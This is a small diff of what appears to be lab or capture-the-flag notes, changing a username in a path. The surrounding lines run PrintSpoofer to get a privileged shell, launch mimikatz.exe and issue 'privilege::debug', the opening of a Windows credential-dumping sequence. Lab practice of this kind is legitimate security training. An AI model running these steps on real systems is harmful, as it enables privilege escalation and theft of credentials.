@@ -14,7 +14,7 @@ exit
 HTTP-ADMIN cmd $ printspoofer.exe -i -c cmd.exe
 
 # Launch mimikatz.exe
-C:\users\http-admin\mimizip\x64\mimikatz.exe
+C:\users\lab-web-admin\mimizip\x64\mimikatz.exe
 
 # Check privilege
 privilege::debug
